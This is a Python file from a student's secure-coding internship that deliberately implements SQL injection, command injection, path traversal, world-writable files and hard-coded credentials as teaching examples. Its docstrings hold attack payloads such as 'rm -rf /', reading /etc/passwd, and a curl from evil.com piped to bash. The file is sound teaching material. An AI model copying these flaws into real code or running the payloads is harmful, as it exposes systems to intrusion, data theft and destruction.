"""
vulnerable_code.py
==================
CodeAlpha Cybersecurity Internship - Task 3: Secure Coding Review
Student: BAGATHEESHWAR A | ID: CA/DF1/82983

PURPOSE:
    This file contains INTENTIONALLY VULNERABLE Python code for educational
    purposes. It demonstrates four critical security vulnerabilities:
    1. SQL Injection
    2. Command Injection
    3. Hardcoded Credentials
    4. Insecure File Handling

⚠️  WARNING: DO NOT USE THIS CODE IN PRODUCTION. FOR EDUCATIONAL USE ONLY.
"""

import sqlite3
import os
import subprocess

# ============================================================
# VULNERABILITY 1: HARDCODED CREDENTIALS
# CWE-798: Use of Hard-coded Credentials
# SEVERITY: CRITICAL
# ============================================================

# ❌ VULNERABLE: Credentials are hard-coded directly in source code.
# Anyone with access to the source code (e.g., via Git) can read them.
DB_HOST     = "192.168.1.100"
DB_USER     = "admin"
DB_PASSWORD = "SuperSecret123!"   # ← Hard-coded password
SECRET_KEY  = "mysecretkey_abc"   # ← Hard-coded secret key
API_KEY     = "sk-1234567890abcdef"  # ← Hard-coded API key


def connect_database():
    """
    ❌ VULNERABLE: Uses hard-coded SQLite path with no access controls.
    The database file is created in the current working directory with
    no permission restrictions.
    """
    conn = sqlite3.connect("users.db")   # ← No path sanitization
    return conn


# ============================================================
# VULNERABILITY 2: SQL INJECTION
# CWE-89: Improper Neutralization of Special Elements in SQL Commands
# SEVERITY: CRITICAL
# ============================================================

def get_user(username):
    """
    ❌ VULNERABLE: User input is directly concatenated into the SQL query.
    
    Attack Example:
        username = "admin' OR '1'='1"
        → Query becomes: SELECT * FROM users WHERE username='admin' OR '1'='1'
        → Returns ALL users, bypassing authentication entirely.
    
    Another attack:
        username = "admin'; DROP TABLE users;--"
        → Destroys the users table.
    """
    conn = connect_database()
    cursor = conn.cursor()

    # ❌ VULNERABLE: String formatting creates injection opportunity
    query = "SELECT * FROM users WHERE username='" + username + "'"
    print(f"[DEBUG] Executing query: {query}")   # ← Also leaks query logic

    cursor.execute(query)   # ← Executes attacker-controlled SQL
    result = cursor.fetchone()
    conn.close()
    return result


def login(username, password):
    """
    ❌ VULNERABLE: Same SQL injection flaw in login function.
    Attacker can log in as ANY user without knowing their password.
    """
    conn = connect_database()
    cursor = conn.cursor()

    # ❌ VULNERABLE: Both username and password are injectable
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()

    if user:
        return True
    return False


# ============================================================
# VULNERABILITY 3: COMMAND INJECTION
# CWE-78: Improper Neutralization of Special Elements in OS Commands
# SEVERITY: CRITICAL
# ============================================================

def ping_host(ip_address):
    """
    ❌ VULNERABLE: User-supplied IP address is passed directly to the shell.
    
    Attack Example:
        ip_address = "127.0.0.1; rm -rf /"
        → Executes: ping -c 1 127.0.0.1; rm -rf /
        → Deletes all files on the system!
    
    Another attack:
        ip_address = "127.0.0.1 && cat /etc/passwd"
        → Dumps system user accounts.
    """
    # ❌ VULNERABLE: shell=True + unsanitized input = command injection
    command = "ping -c 1 " + ip_address
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout


def run_diagnostics(tool_name):
    """
    ❌ VULNERABLE: Executes arbitrary system commands via os.system().
    os.system() always uses a shell, making injection trivial.
    
    Attack Example:
        tool_name = "whoami; curl http://evil.com/malware.sh | bash"
        → Downloads and executes malicious script.
    """
    # ❌ VULNERABLE: Direct OS command execution with no validation
    os.system(tool_name)


# ============================================================
# VULNERABILITY 4: INSECURE FILE HANDLING
# CWE-22: Path Traversal | CWE-732: Incorrect Permission Assignment
# SEVERITY: HIGH
# ============================================================

def read_user_file(filename):
    """
    ❌ VULNERABLE: Path traversal attack possible.
    
    Attack Example:
        filename = "../../../../etc/passwd"
        → Reads /etc/passwd regardless of intended directory.
        → Exposes system user accounts.
    
    Another attack:
        filename = "../secret_config.env"
        → Reads parent directory files.
    """
    # ❌ VULNERABLE: No path sanitization or directory restriction
    with open(filename, 'r') as f:   # ← Arbitrary file read
        return f.read()


def write_log(filename, content):
    """
    ❌ VULNERABLE: Three issues:
    1. Path traversal (attacker controls where log is written)
    2. File created with overly permissive mode 0o777 (rwxrwxrwx)
    3. No input validation on content being logged
    """
    # ❌ VULNERABLE: Attacker-controlled path + world-writable permissions
    with open(filename, 'a', opener=lambda path, flags: os.open(path, flags, 0o777)) as f:
        f.write(content + "\n")   # ← Unsanitized content written to file


def save_upload(filename, data):
    """
    ❌ VULNERABLE: Multiple issues:
    1. No file type validation (attacker could upload .py, .sh, etc.)
    2. No file size limit (denial-of-service via large upload)
    3. Path traversal via crafted filename
    4. Executable files could be uploaded
    """
    upload_dir = "uploads/"

    # ❌ VULNERABLE: No sanitization of filename from user input
    filepath = upload_dir + filename   # ← Path traversal possible
    
    with open(filepath, 'wb') as f:
        f.write(data)   # ← No size limit, no type check
    
    print(f"Saved file: {filepath}")


# ============================================================
# BONUS VULNERABILITY: SENSITIVE DATA EXPOSURE
# CWE-200: Exposure of Sensitive Information
# ============================================================

def debug_user_info(user):
    """
    ❌ VULNERABLE: Logs and prints sensitive user data (password, tokens).
    In production, these logs could be read by unauthorized parties.
    """
    # ❌ VULNERABLE: Prints sensitive information including password
    print(f"[DEBUG] User data: {user}")
    print(f"[DEBUG] Connecting with password: {DB_PASSWORD}")
    print(f"[DEBUG] Using API key: {API_KEY}")


# ============================================================
# MAIN - DEMO OF VULNERABLE FUNCTIONS
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("  VULNERABLE CODE DEMO (Educational Purposes Only)")
    print("=" * 60)
    
    # These calls demonstrate the vulnerable functions
    # In a real attack, an attacker would supply malicious input
    
    print("\n[1] SQL Injection Demo:")
    print(f"    Query built with user input directly concatenated")
    
    print("\n[2] Command Injection Demo:")
    print(f"    ping_host('127.0.0.1; whoami') would run whoami")
    
    print("\n[3] Hardcoded Credentials Demo:")
    print(f"    DB Password visible in source: {DB_PASSWORD}")
    
    print("\n[4] Path Traversal Demo:")
    print(f"    read_user_file('../../../etc/passwd') would read /etc/passwd")
    
    print("\n⚠️  See secure_code.py for the fixed versions of all functions.")
